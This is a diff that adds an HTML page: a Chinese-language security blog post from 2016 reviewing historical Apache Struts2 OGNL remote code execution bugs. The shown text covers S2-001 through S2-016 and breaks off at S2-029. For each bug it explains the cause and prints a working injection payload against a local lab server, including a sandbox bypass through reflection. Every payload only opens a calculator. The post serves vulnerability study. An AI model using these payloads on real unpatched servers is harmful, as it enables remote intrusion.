@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="刚爆出 Struts2 远程命令执行 S2-032 的时候让我有点心无力，作为一名安全研究员还是不能偷懒，经典漏洞还是应该去分析回顾一下的。 如果你想看的是详细的底层代码跟踪分析，那我也只能 say sorry 了。能力有限一些细节无法很好的写在这里，因为确实太多了 QWQ。这里只是对 ST2 历史 RCE 漏洞的一个回顾，同时也希望对这些有漏洞有疑惑或者和我一样曾经对它感到吃力的人带来一点点帮助">
+<meta name="keywords" content="web,security,java">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2 历史 RCE 漏洞回顾不完全系列">
+<meta property="og:url" content="http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="刚爆出 Struts2 远程命令执行 S2-032 的时候让我有点心无力，作为一名安全研究员还是不能偷懒，经典漏洞还是应该去分析回顾一下的。 如果你想看的是详细的底层代码跟踪分析，那我也只能 say sorry 了。能力有限一些细节无法很好的写在这里，因为确实太多了 QWQ。这里只是对 ST2 历史 RCE 漏洞的一个回顾，同时也希望对这些有漏洞有疑惑或者和我一样曾经对它感到吃力的人带来一点点帮助">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/1.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/4.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/5.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/6.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/7.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/8.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/9.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/10.png">
+<meta property="og:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/12.png">
+<meta property="og:updated_time" content="2018-04-24T15:52:36.485Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Struts2 历史 RCE 漏洞回顾不完全系列">
+<meta name="twitter:description" content="刚爆出 Struts2 远程命令执行 S2-032 的时候让我有点心无力，作为一名安全研究员还是不能偷懒，经典漏洞还是应该去分析回顾一下的。 如果你想看的是详细的底层代码跟踪分析，那我也只能 say sorry 了。能力有限一些细节无法很好的写在这里，因为确实太多了 QWQ。这里只是对 ST2 历史 RCE 漏洞的一个回顾，同时也希望对这些有漏洞有疑惑或者和我一样曾经对它感到吃力的人带来一点点帮助">
+<meta name="twitter:image" content="http://rickgray.me/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Struts2 历史 RCE 漏洞回顾不完全系列</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2016/06/01/how-to-scan-and-check-vulnerabilities/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2016/04/08/serialization-troubles-in-message-queuing-componet/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&text=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&is_video=false&description=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Struts2 历史 RCE 漏洞回顾不完全系列&body=Check out this article: http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&title=Struts2 历史 RCE 漏洞回顾不完全系列"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities/&name=Struts2 历史 RCE 漏洞回顾不完全系列&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-001"><span class="toc-number">1.</span> <span class="toc-text">S2-001</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-007"><span class="toc-number">2.</span> <span class="toc-text">S2-007</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-008"><span class="toc-number">3.</span> <span class="toc-text">S2-008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-012"><span class="toc-number">4.</span> <span class="toc-text">S2-012</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-013-S2-014"><span class="toc-number">5.</span> <span class="toc-text">S2-013 | S2-014</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-015"><span class="toc-number">6.</span> <span class="toc-text">S2-015</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-016"><span class="toc-number">7.</span> <span class="toc-text">S2-016</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-029"><span class="toc-number">8.</span> <span class="toc-text">S2-029</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S2-032"><span class="toc-number">9.</span> <span class="toc-text">S2-032</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#比较关键的-OGNL-表达式"><span class="toc-number">10.</span> <span class="toc-text">比较关键的 OGNL 表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Struts2 历史 RCE 漏洞回顾不完全系列
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2016-05-05T16:00:00.000Z" itemprop="datePublished">2016-05-06</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/java/">java</a>, <a class="tag-link" href="/tags/security/">security</a>, <a class="tag-link" href="/tags/web/">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>刚爆出 Struts2 远程命令执行 S2-032 的时候让我有点心无力，作为一名安全研究员还是不能偷懒，经典漏洞还是应该去分析回顾一下的。</p>
+<p>如果你想看的是详细的底层代码跟踪分析，那我也只能 say sorry 了。能力有限一些细节无法很好的写在这里，因为确实太多了 QWQ。这里只是对 ST2 历史 RCE 漏洞的一个回顾，同时也希望对这些有漏洞有疑惑或者和我一样曾经对它感到吃力的人带来一点点帮助。所有文中所提漏洞的测试环境 WAR 包附后，想要自己进行复现测试或者查看漏洞起因关键代码的同学可以下载下来跟着文章实践一下。</p>
+<p>已经完成：S2-001, S2-007, S2-008, S2-012, S2-013, S2-015, S2-016, S2-029, S2-32 （WAR 包集合 <a href="http://pan.baidu.com/s/1nvfDDdZ" target="_blank" rel="noopener">http://pan.baidu.com/s/1nvfDDdZ</a>:tdb8）</p>
+<p>未完成：S2-003, S2-005, S2-009, S2-020, S2-021, S2-022</p>
+<p>（前方高能，一大波 “计算器” 即将来临）</p>
+<h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-001.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-001.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.0.8</p>
+<p>修复摘要：数据 re-display 时禁止执行 OGNL 表达式</p>
+</blockquote>
+<p>该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 <code>%{value}</code> 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 <code>%{value}</code> 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行：</p>
+<pre><code>%{@java.lang.Runtime@getRuntime().exec(&quot;open /Applications/Calculator.app&quot;)}
+</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/1.png" alt=""></p>
+<h3 id="S2-007"><a href="#S2-007" class="headerlink" title="S2-007"></a>S2-007</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-007.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-007.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.2.3</p>
+<p>修复摘要：在转换的过程中进行字符过滤</p>
+<p>修复补丁：<a href="https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892" target="_blank" rel="noopener">https://fisheye6.atlassian.com/changelog/struts?cs=b4265d369dc29d57a9f2846a85b26598e83f3892</a></p>
+</blockquote>
+<p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。例如这里有一个 <code>UserAction</code>：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> Integer age;</span><br><span class="line">	<span class="keyword">private</span> String name;</span><br><span class="line">	<span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
+<p>然后配置有 <code>UserAction-validation.xml</code>：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE validators PUBLIC</span></span><br><span class="line"><span class="meta">	"-//OpenSymphony Group//XWork Validator 1.0//EN"</span></span><br><span class="line"><span class="meta">	"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">"age"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">"int"</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"min"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"max"</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当用户提交 <code>age</code> 为字符串而非整形数值时，后端用代码拼接 <code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。</p>
+<p>因为受影响版本为 Struts2 2.0.0 - Struts2 2.2.3，所以这里给出绕过安全配置进行命令执行的 Payload：</p>
+<pre><code>&apos; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@java.lang.Runtime@getRuntime().exec(&quot;open /Applications/Calculator.app&quot;)) + &apos;
+</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/4.png" alt=""></p>
+<h3 id="S2-008"><a href="#S2-008" class="headerlink" title="S2-008"></a>S2-008</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-008.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-008.html</a></p>
+<p>影响版本：Struts 2.1.0 - Struts 2.3.1</p>
+<p>修复摘要：添加参数名和 Cookie 名白名单 acceptedParamNames = “[a-zA-Z0-9.][()_’]+”;</p>
+</blockquote>
+<p>S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 <code>devMode</code> 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。</p>
+<p>例如在 <code>devMode</code> 模式下直接添加参数 <code>?debug=command&amp;expression=&lt;OGNL EXP&gt;</code> 会直接执行后面的 OGNL 表达式，因此可以直接执行命令（注意转义）：</p>
+<pre><code>http://localhost:8080/S2-008/devmode.action?debug=command&amp;expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29)
+</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/5.png" alt=""></p>
+<h3 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-012.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-012.html</a></p>
+<p>影响版本：Struts 2.0.0 － Struts 2。3.13</p>
+<p>修复摘要：默认禁用 OGNLUtil 类的 OGNL 表达式执行</p>
+</blockquote>
+<p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 <code>${param_name}</code> 作为重定向变量，例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-012"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.UserAction"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"redirect"</span> <span class="attr">type</span>=<span class="string">"redirect"</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"input"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里 <code>UserAction</code> 中定义有一个 <code>name</code> 变量，当触发 <code>redirect</code> 类型返回时，Struts2 获取使用 <code>${name}</code> 获取其值，在这个过程中会对 <code>name</code> 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行：</p>
+<pre><code>http://localhost:8080/S2-012/user.action?name=%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D
+</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/6.png" alt=""></p>
+<h3 id="S2-013-S2-014"><a href="#S2-013-S2-014" class="headerlink" title="S2-013 | S2-014"></a>S2-013 | S2-014</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-013.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-013.html</a>, <a href="https://struts.apache.org/docs/s2-014.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-014.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.14 (Struts 2.3.14.1)</p>
+<p>修复摘要：在对标签进行请求参数操作时禁用 OGNL 表达式解析</p>
+</blockquote>
+<p>Struts2 标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都包含一个 <code>includeParams</code> 属性，其值可设置为 <code>none</code>，<code>get</code> 或 <code>all</code>，参考官方其对应意义如下：</p>
+<ol>
+<li>none - 链接不包含请求的任意参数值（默认）</li>
+<li>get - 链接只包含 GET 请求中的参数和其值</li>
+<li>all - 链接包含 GET 和 POST 所有参数和其值</li>
+</ol>
+<p>若设置了 <code>includeParams=&quot;get&quot;</code> 或者 <code>includeParams=&quot;all&quot;</code>，在获取对应类型参数时后端会对参数值进行 OGNL 表达式解析，因此可以插入任意 OGNL 表达式导致命令执行：</p>
+<pre><code>http://localhost:8080/S2-013/link.action?xxxx=%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D
+</code></pre><p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/7.png" alt=""></p>
+<p>S2-014 是对 S2-013 修复的加强，在 S2-013 修复的代码中忽略了 <code>${ognl_exp}</code> OGNL 表达式执行的方式，因此 S2-014 是对其的补丁加强。</p>
+<pre><code>http://localhost:8080/S2-013/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D
+</code></pre><h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-015.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-015.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.14.2</p>
+<p>修复摘要：针对 Action 名称进行默认字符限制 [a-z]<em>[A-Z]</em>[0-9]<em>[.-_!/]</em> </p>
+</blockquote>
+<p>漏洞产生于配置了 Action 通配符 <code>*</code>，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-015"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"*"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.PageAction"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>上述配置能让我们访问 <code>name.action</code> 时使用 <code>name.jsp</code> 来渲染页面，但是在提取 <code>name</code> 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 <code>name</code> 值的位置比较特殊，一些特殊的字符如 <code>/</code> <code>&quot;</code> <code>\</code> 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
+<p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 <code>SecurityMemberAccess</code> 类中的 <code>setAllowStaticMethodAccess</code> 方法，因此在 2.3.14.2 版本以后都不能直接通过 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code> 来修改其值达到重获静态方法调用的能力。</p>
+<p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 <code>(new java.lang.ProcessBuilder(&#39;calc&#39;)).start()</code> 来解决，另外还可以借助 Java 反射机制去间接修改：</p>
+<pre><code>#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true)
+</code></pre><p>可以构造 Payload 如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/S2-015/$&#123;%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23f=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec(&apos;calc&apos;)&#125;.action</span><br></pre></td></tr></table></figure>
+<p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/8.png" alt=""></p>
+<p>除了上面所说到的这种情况以外，S2-015 还涉及一种二次引用执行的情况：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"param"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.ParamAction"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span> <span class="attr">type</span>=<span class="string">"httpheader"</span>&gt;</span></span><br><span class="line">	  	<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>305<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">  				<span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">"headers.fxxk"</span>&gt;</span>$&#123;message&#125;<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里配置了 <code>&lt;param name=&quot;errorMessage&quot;&gt;${message}&lt;/param&gt;</code>，其中 <code>message</code> 为 <code>ParamAction</code> 中的一个私有变量，这样配置会导致触发该 Result 时，Struts2 会从请求参数中获取 <code>message</code> 的值，并在解析过程中，触发了 OGNL 表达式执行，因此只用提交 <code>%{1111*2}</code> 作为其变量值提交就会得到执行。这里需要注意的是这里的二次解析是因为在 <code>struts.xml</code> 中使用 <code>${param}</code> 引用了 Action 中的变量所导致的，并不针对于 <code>type=&quot;httpheader&quot;</code> 这种返回方式。</p>
+<p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/9.png" alt=""></p>
+<h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><blockquote>
+<p>官方链接：<a href="https://struts.apache.org/docs/s2-016.html" target="_blank" rel="noopener">https://struts.apache.org/docs/s2-016.html</a></p>
+<p>影响版本：Struts 2.0.0 - Struts 2.3.15</p>
+<p>修复摘要：删除 “action:”，”redirect:”，”redirectAction:” 这些前置前缀调用</p>
+</blockquote>
+<p><code>DefaultActionMapper</code> 类支持以 <code>action:</code>，<code>redirect:</code> 和 <code>redirectAction:</code> 作为访问前缀，前缀后面可以跟 OGNL 表达式，由于 Struts2 未对其进行过滤，导致任意 Action 可以使用这些前缀执行任意 OGNL 表达式，从而导致任意命令执行，经测试发现 <code>redirect:</code> 和 <code>redirectAction:</code> 这两个前缀比较好容易构造出命令执行的 Payload（转义后）：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://localhost:8080/S2-016/default.action?redirect:$&#123;%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]%3Dfalse,%23f%3D%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec(&apos;open%20%2fApplications%2fCalculator.app&apos;)&#125;</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">http://localhost:8080/S2-016/default.action?redirectAction:%25&#123;(new+java.lang.ProcessBuilder(new+java.lang.String[]&#123;&apos;open&apos;,&apos;/Applications/Calculator.app&apos;&#125;)).start()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/articles/2016-05-06-review-struts2-remote-command-execution-vulnerabilities/10.png" alt=""></p>
+<h3 id="S2-029"><a href="#S2-029" class="headerlink" title="S2-029"></a>S2-029</h3><blockquote>
